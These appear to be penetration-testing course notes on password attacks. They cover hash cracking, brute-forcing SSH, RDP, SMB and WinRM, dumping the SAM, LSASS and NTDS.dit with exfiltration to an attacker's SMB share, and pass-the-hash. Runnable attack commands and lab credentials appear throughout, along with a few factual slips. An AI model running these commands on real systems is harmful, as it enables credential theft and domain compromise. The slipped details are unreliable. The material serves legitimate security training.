# Credential Storage in Linux
- **Credential Storage**: Authentication mechanisms store credentials locally or in databases. Web apps are vulnerable to SQL injections, potentially exposing plaintext data.
- **Common Password Wordlists**: Example - `rockyou.txt`, created after the RockYou breach (32M accounts stored in plaintext).

### Linux Credential Storage
- **Password Storage**: Located in `/etc/shadow`, part of Linux user management.
- **Password Format**: Usually stored as hashes.

### `/etc/shadow` File Structure
- **File Location**: `/etc/shadow`
- **Example Entry**:

![image](https://github.com/user-attachments/assets/a94bf53d-a0ed-44a6-bede-5089a6f1cbd1)


### Password Encryption Format
- **General Format**: `$<id>$<salt>$<hashed password>`
- Example: `$ y	$ j9T	$ 3QSBB6CbHEu...SNIP...f8Ms`

### Cryptographic Hash Algorithms
| ID    | Algorithm         |
|-------|-------------------|
| $1$   | MD5               |
| $2a$  | Blowfish          |
| $5$   | SHA-256           |
| $6$   | SHA-512           |
| $sha1$| SHA1crypt         |
| $y$   | Yescrypt          |
| $gy$  | Gost-yescrypt     |
| $7$   | Scrypt            |

### Additional User Management Files
1. **`/etc/passwd`**
   ![image](https://github.com/user-attachments/assets/31fb511b-1a52-4bc2-b700-b7e1e37943da)

 - Previously stored encrypted passwords; now only accessible by root.
 - **Format**: `<username>:x:<uid>:<gid>:<comment>:<home directory>:<cmd after login>`
 - The `x` indicates the password is in `/etc/shadow`.

2. **`/etc/group`**
 - Manages group information.


### Security Note
- **Permissions Matter**: Incorrect `/etc/shadow` file permissions can lead to root user login vulnerabilities without a password.

## Windows Authentication Process

- **Windows Authentication** involves complex modules for logon, retrieval, and verification (e.g., Kerberos).
- **Local Security Authority (LSA)**: Authenticates users, maintains local security info, manages security IDs (SIDs), and checks access permissions.
- **Domain Controllers**: Store security policies and accounts in Active Directory for centralized management.

### Key Components
1. **Winlogon**
   - Manages security-related user interactions (login, password changes, workstation locking).
   - Uses **Credential Providers** (COM objects in DLLs) to obtain login details.
   - **LogonUI**: Displays login interface and gathers credentials.

2. **LSASS (Local Security Authority Subsystem Service)**
   - Located at `%SystemRoot%\System32\Lsass.exe`.
   - Manages local security policies, user authentication, and security audit logs.
   - **Authentication Packages**:
     | Package       | Description                                            |
     |---------------|--------------------------------------------------------|
     | `Lsasrv.dll`  | Enforces security policies; manages security packages. |
     | `Msv1_0.dll`  | Handles non-domain logins.                             |
     | `Samsrv.dll`  | Manages local security accounts.                       |
     | `Kerberos.dll`| Handles Kerberos-based authentication.                 |
     | `Netlogon.dll`| Network-based logon service.                           |
     | `Ntdsa.dll`   | Manages Windows registry records.                      |

### SAM Database
- **Location**: `%SystemRoot%\system32\config\SAM`, mounted at `HKLM/SAM`.
- **Role**: Stores user passwords in hash format (LM/NTLM). Requires SYSTEM permissions for access.
- **Workgroup vs. Domain**:
  - **Workgroup**: SAM handles credentials locally.
  - **Domain**: Domain Controller validates credentials using the Active Directory database (`ntds.dit`).

### NTDS.dit
- **Active Directory Database** stored at `%SystemRoot%\ntds.dit`.
- **Contents**: User accounts (username & password hash), group accounts, computer accounts, and group policy objects.
- **Synchronization**: NTDS.dit is synced across Domain Controllers (excluding Read-Only Domain Controllers).

### Credential Manager
- **Role**: Saves credentials for network resources and websites, encrypted in the **Credential Locker**.
- **Storage Location**: 
PS C:\Users[Username]\AppData\Local\Microsoft[Vault/Credentials]\

- **Decryption Methods**: Various tools and techniques can decrypt stored credentials.

### Security Features
- **SYSKEY (Windows NT 4.0)**: Partially encrypts the SAM database to protect password hashes from offline attacks.

### NTDS (Network Directory Services)
- **Domain Environment**: Common in networks where Windows systems are joined to a domain.
- **Logon Requests**: Sent to Domain Controllers within the same Active Directory forest.
- **NTDS.dit File**: Stores various Active Directory data, such as:
- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

# John the Ripper (JTR)
- **JTR** is a popular open-source tool for testing password strength and cracking encrypted passwords using brute force or dictionary attacks.
- Initially developed for UNIX-based systems (1996), it is widely used in the security field.
- The "Jumbo" variant includes optimizations, multilingual wordlists, and support for 64-bit systems.

## Supported Encryption Technologies
- **UNIX crypt(3)**: Traditional UNIX encryption with a 56-bit key.
- **DES-based**: Uses the Data Encryption Standard.
- **Blowfish-based**: 448-bit key encryption.
- **SHA-crypt hashes**: Commonly used in modern Linux distributions.
- **Windows LM**: Uses a 56-bit key for encryption.
- **And many more**: Supports a wide range of encryption formats.

## Attack Methods
1. **Dictionary Attacks**:
   - Uses a pre-generated list of words to compare against hashed passwords.
   - Common and effective but requires comprehensive wordlists.
2. **Brute Force Attacks**:
   - Attempts every possible combination of characters.
   - Time-consuming, especially for long or complex passwords.
3. **Rainbow Table Attacks**:
   - Uses precomputed hash-password pairs for quick lookup.
   - Limited by the size of the rainbow table.

## Cracking Modes
1. **Single Crack Mode**:
   - Uses built-in wordlist or user-specified rules.
   - Basic but less efficient for complex passwords.
   - Command example:
   - ```
     john --format=<hash_type> <hash_file>
     ```
     ## Cracking with John
   - Supports various hash formats, e.g.,
  ```
  john --format=sha256 hashes_to_crack.txt`.
  ```
   - Outputs cracked passwords to "john.pot" in the user's home directory.
   - Progress can be viewed with `john --show`.
![image](https://github.com/user-attachments/assets/5a5c0ab1-6829-4b8c-8935-6f87483f775c)

2. **Wordlist Mode**:
   - Cracks passwords using one or more wordlists.
   - Allows applying mangling rules to modify words in the list.
   - Command example:
   - ```
     john --wordlist=<wordlist_file> --rules <hash_file>
     ```



 3. Incremental Mode in John
   - **Command:** `john --incremental <hash_file>`
     - Reads the hashes from the specified file and generates all possible character combinations, incrementing the length with each iteration.
     - **Resource-Intensive:** Takes a long time to complete, depending on password complexity and system performance.
     - **Character Set:** Default is `a-zA-Z0-9`. For complex passwords with special characters, a custom character set is needed.

### Cracking Files with John
It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them.

```

pdf2john server_doc.pdf > server_doc.hash
 john server_doc.hash
```
```
 john --wordlist=<wordlist.txt> server_doc.hash
```
![image](https://github.com/user-attachments/assets/58c7507c-0f88-4090-baf8-7f87df75cc81)

locate more tools

```
locate *2john*
```
# Network Services

- During penetration tests, networks have various services to manage, edit, or create content, hosted with specific permissions.
- Common services include:
  - **FTP** - **SMB**  - **NFS** - **IMAP/POP3** - **SSH** - **MySQL/MSSQL** - **RDP** - **WinRM** - **VNC** - **Telnet**- **SMTP**- **LDAP**

### Managing Windows Server
- To manage a Windows server remotely, use services like:
  - **RDP** (Remote Desktop Protocol)
  - **WinRM** (Windows Remote Management)
  - **SSH** (less common on Windows)

- All services typically require authentication (username and password), though they can be configured for key-based access.

### WinRM
- **Definition:** Windows Remote Management (WinRM) is the Microsoft implementation of the WS-Management protocol.
- **Protocol Type:** Based on XML web services using SOAP for remote management.
- **Communication:** Interfaces with WBEM and WMI, can invoke DCOM.
- **Configuration:** Must be manually activated on Windows 10; depends on security settings in the environment.
- **Ports Used:** 
  - **TCP 5985** (HTTP)
  - **TCP 5986** (HTTPS)

### CrackMapExec
- **Purpose:** Tool for password attacks, also supports SMB, LDAP, MSSQL, etc.
- **Installation Command:**  
  ```bash
  sudo apt-get -y install crackmapexec
  ```
**CrackMapExec Menu Options**
```
crackmapexec -h
```

**CrackMapExec Protocol-Specific Help**

```
crackmapexec smb -h
```

**CrackMapExec Usage**
```
crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
```
![image](https://github.com/user-attachments/assets/970fcdc5-c6e6-4b6a-b643-3f73d912fa8f)
The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. 

Communicate with the WinRM service is Evil-WinRM

### Evil-WinRM

**Installing Evil-WinRM**

```
sudo gem install evil-winrm
```
**Evil-WinRM Usage**

```
 evil-winrm -i 10.129.42.197 -u user -p password
```

### SSH (Secure Shell)
- **Definition:** A secure method to connect to remote hosts for executing commands or transferring files.
- **Default Port:** TCP port **22**.
- **Encryption Methods:**
  - **Symmetric Encryption:** Same key for encryption and decryption. Requires a key exchange (e.g., Diffie-Hellman). Common ciphers include AES, Blowfish, and 3DES.
  - **Asymmetric Encryption:** Uses a private key (kept secret) and a public key. The server uses the public key for authentication; the client decrypts messages with the private key.
  - **Hashing:** Converts transmitted data into a unique value to confirm authenticity.

### Hydra for SSH
- **Command to brute-force SSH:**
  ```bash
  hydra -L user.list -P password.list ssh://10.129.42.197
  ```
Login to SSH

```
 ssh user@10.129.42.197
```
### RDP
- Definition: Microsoft's protocol for remote access to Windows systems.
- Default Port: TCP port 3389.
- Features:
   Allows remote access to Windows hosts.
   Supports audio, keyboard, mouse input, and document printing.
   Application layer protocol using TCP and UDP.

**Hydra for RDP**
```
hydra -L user.list -P password.list rdp://10.129.42.197
```

**XFreeRdp**

```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
### Server Message Block (SMB)

- **Purpose**: Protocol for transferring data between client and server in local area networks.
- **Uses**:
  - File and directory sharing
  - Printing services in Windows networks
- **Comparison**: Similar to NFS for Unix/Linux for local network drives.
- **Also Known As**: Common Internet File System (CIFS).
- **Compatibility**: Enables remote connections across platforms (Windows, Linux, macOS).
- **Open Source Implementation**: Samba.
- **Brute Forcing Tool**: Hydra can be used to attempt different usernames and passwords with SMB.

**Hydra - SMB**

```
hydra -L user.list -P password.list smb://10.129.42.197
```
you may get an error rThis is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

**Metasploit Framework**

```
msfconsole -q
use auxiliary/scanner/smb/smb_login
```
then set the wordlist and for both user and pass to bruteforce.

Now we can use CrackMapExec again to view the available shares and what privileges we have for them.

**CrackMapExec**

```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

use smbclient to communicate

**Smbclient**
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
# Password Mutations

- **Purpose**: Enhance security by enforcing password complexity through policies.
- **Common Password Policies**:
  - Minimum length: 8 characters
  - Must include: 
    - Capital letters
    - Special characters
    - Numbers

- **Weak Password Patterns**:
  - Users often create passwords related to their interests or company names.
  - Common additions for weak passwords:
    - First letter uppercase: `Password`
    - Adding numbers: `Password123`
    - Adding year: `Password2022`
    - Adding month: `Password02`
    - Last character as exclamation mark: `Password2022!`
    - Adding special characters: `P@ssw0rd2022!`

- **Password Length Statistics**: 
  - Most passwords are not longer than 10 characters.
  
- **Example of Password Creation**:
  - Combining a single word with the current year and a special character can meet complexity requirements (e.g., `January2022!`).

### Password List Example

We can use a very powerful tool called Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. 

![image](https://github.com/user-attachments/assets/85190865-3329-4241-8228-d3c84b6ad42c)

![image](https://github.com/user-attachments/assets/d29d9ebc-bc78-4274-a223-8351ae294bcd)

Each rule is written on a new line which determines how the word should be mutated.

### Hashcat Rule File
store the below into a file eg. custom.rule
```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list 
### Generating Rule-based Wordlist
```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
cat mut_password.list
```
Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule, which can often lead to good results. 
Here’s a condensed version of the text without bullet points:

Password cracking is primarily a guessing game, but it can become more effective with targeted guessing. By understanding the password policy and considering factors like the company name, geographical region, and industry-specific terms, one can tailor the approach to better align with users' likely choices. Exceptions occur when passwords are leaked, providing direct insight into potential passwords.

**Hashcat Existing Rules**

```
 ls /usr/share/hashcat/rules/
```
### Generating Wordlists Using CeWL
We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
```
# Password Reuse / Default Passwords

## Default Credentials and Credential Stuffing

- **Common Issues**:
  - Users and administrators often leave default credentials in place, forgetting to change them after installation.
  - Easy-to-remember passwords are frequently reused, especially in large infrastructures with many interfaces.

- **Credential Stuffing**:
  - Involves using known default credentials to access services.
  - Simpler than brute-forcing as it uses composite usernames and passwords from known lists.

- **Default Credential Sources**:
  - Common databases like the [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) list known default credentials for various products.

Default credentials can also be found in the product documentation, as they contain the steps necessary to set up the service successfully. Some devices/applications require the user to set up a password at install, but others use a default, weak password. Attacking those services with the default or obtained credentials is called Credential Stuffing.  we can create a new list that separates these composite credentials with a colon (username:password). In addition, we can select the passwords and mutate them by our rules to increase the probability of hits.

- **Hydra Usage for Credential Stuffing**:
- Create a list of composite credentials (username:password).
- Use the following Hydra syntax to perform credential stuffing:
  ```bash
  hydra -C <user_pass.list> <protocol>://<IP>
  ```
- Example for SSH:
  ```bash
  hydra -C user_pass.list ssh://10.129.42.197
  ```

- **Role of OSINT**:
- Helps understand company structure and infrastructure for better password and username combinations.
- Useful for identifying hardcoded credentials in applications via Google searches.

**Google Search - Default Credentials**
![image](https://github.com/user-attachments/assets/f862824f-cf47-4c33-a32a-692371b1c6b5)

In addition to application default credentials, there are [lists](https://www.softwaretestinghelp.com/default-router-username-and-password-list/) available specifically for routers. However, it's less common for router default credentials to remain unchanged since administrators usually prioritize securing these central network interfaces.

# Attacking SAM

With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. 

## Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. 

![image](https://github.com/user-attachments/assets/77ba71ad-a7f8-45a1-bad4-105e7cbb0bc4)

### Using reg.exe save to Copy Registry Hives
```
reg.exe save hklm\sam C:\sam.save
```
```
reg.exe save hklm\system C:\system.save
```
```
reg.exe save hklm\security C:\security.save
```
Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. 
### Creating a Share with smbserver.py
All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). 
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

use move command to move copies to share

### Moving Hive Copies to Share

```
move sam.save \\10.10.15.16\CompData
```

## Dumping Hashes with Impacket's secretsdump.py
 tool we can use to dump the hashes offline is Impacket's secretsdump.py

 ### Locating secretsdump.py
 ```
locate secretsdump
```
### Running secretsdump.py
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
Secretsdump successfully dumps the local SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database.

Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.

## Cracking Hashes with Hashcat

### Adding nthashes to a .txt File
```
sudo vim hashestocrack.txt
```
### Running Hashcat against NT Hashes
Selecting a mode is largely dependent on the type of attack and hash type we want to crack. We will focus on using -m to select the hash type 1000 to crack our NT hashes. (use hashcat page to find other hash types and their number)
```
 sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
We can see from the output that Hashcat used a type of attack called a dictionary attack to rapidly guess the passwords utilizing a list of known passwords (rockyou.txt) and was successful in cracking 3 of the hashes.  It is very common for people to re-use passwords across different work & personal accounts.

### Remote Dumping & LSA Secrets Considerations
With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

**Dumping LSA Secrets Remotely**

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
**Dumping SAM Remotely**

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
# Attacking LSASS
 LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

Cache credentials locally in memory
Create access tokens
Enforce security policies
Write to Windows security log

## Dumping LSASS Process Memory
Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. 

There are many techniques to create memory dump.

### Task Manager Method
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

lsass.DMP is created and saved in:
```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
use the file transfer method discussed in the Attacking SAM

### Rundll32.exe & Comsvcs.dll Method
use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. It is important to note that modern anti-virus tools recognize this method as malicious activity.

determine what process ID (PID) is assigned to lsass.exe.
**Finding LSASS PID in cmd**

```
tasklist /svc
```
**Finding LSASS PID in PowerShell**
```
Get-Process lsass
```

**Creating lsass.dmp using PowerShell**
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp).

If the lsass.dmp file is generated we transfer it to attack host and extract the creds.


### Using Pypykatz to Extract Credentials

we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python.Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. 

**Running Pypykatz**
The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. 
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
We will get an output

**MSV** MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.Pypykatz extracted the SID, Username, Domain, and even the NT & SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory. 

**WDIGEST** - WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text

**Kerberos** - Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. 

**DPAPI** - The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. 
## Cracking the NT Hash with Hashcat

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

# Attacking Active Directory & NTDS.dit

- **Definition**: Critical directory service in enterprise networks, primarily for managing Windows systems.
- **Importance**: Extensive topic; multiple modules cover attacking and defending AD environments.


## Attack Prerequisites

- **Network Reachability**: Target must be accessible over the network.
- **Internal Foothold**: Typically requires initial compromise to access the internal network.
- **Remote Access**: Organizations may use port forwarding (e.g., RDP on port 3389) to access internal systems.

### Authentication Process

- Once a Windows system is joined to a domain, it sends all authentication requests to the domain controller, rather than using the SAM database by default.
- Local account logon is still possible by specifying the hostname (e.g., `WS01/nameofuser`) or using `./` at the logon UI.
- This is important for understanding which system components are affected by attacks and may provide additional avenues for targeting Windows systems, both with physical access and over the network.
- Awareness of this technique aids in studying NTDS attacks.

## Dictionary Attacks against AD accounts using CrackMapExec
Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &/or password using a customized list of potential usernames and passwords. It can be rather noisy (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy.

consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username.  Organisations follow a naming convention.

an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username. Google the domain name , i.e., “@inlanefreight.com” can get some valid emails.

### Creating a Custom list of Usernames
Create a custom list yourself using the usual convention like the example below.( name - Ben Williamson )
![image](https://github.com/user-attachments/assets/74060651-89ed-46f2-962a-30eb7638f8b5)

Use automated username generator such as the Ruby-based tool Username Anarchy to convert a list of real names into common username formats. 
```
./username-anarchy -i /home/ltnbob/names.txt
```

### Launching the Attack with CrackMapExec
Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. 
```
 crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
CrackMapExec is using SMB to attempt to logon as user (-u) bwilliamson using a password (-p) list containing a list of commonly used passwords (/usr/share/wordlists/fasttrack.txt). This can be countered by account lockout policy. (default it is not enforced)

**Event Logs from the Attack**
It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to Event Viewer and view the Security events to see the exact actions that were logged. 

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

## Capturing NTDS.dit

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. 

### Connecting to a DC with Evil-WinRM
```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
### Checking Local Group Membership
check to see what privileges bwilliamson has
```
net localgroup
```
To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights.
### Checking User Account Privileges including Domain
```
net user bwilliamson
```
This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

## Creating Shadow Copy of C:
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. 
```
vssadmin CREATE SHADOW /For=C:
```
### Copying NTDS.dit from the VSS
copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
use the technique from attacking sam to create an SMB share on our attack host.
### Transferring NTDS.dit to Attack Host
```
 cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
 ```
## A Faster Method: Using cme to Capture NTDS.dit
sing CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
## Cracking Hashes & Gaining Credentials

### Cracking a Single Hash with Hashcat
```
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
if crack unsuccessful use pass the hash technique.
## Pass-the-Hash Considerations
We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login

### Pass-the-Hash with Evil-WinRM Example
```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
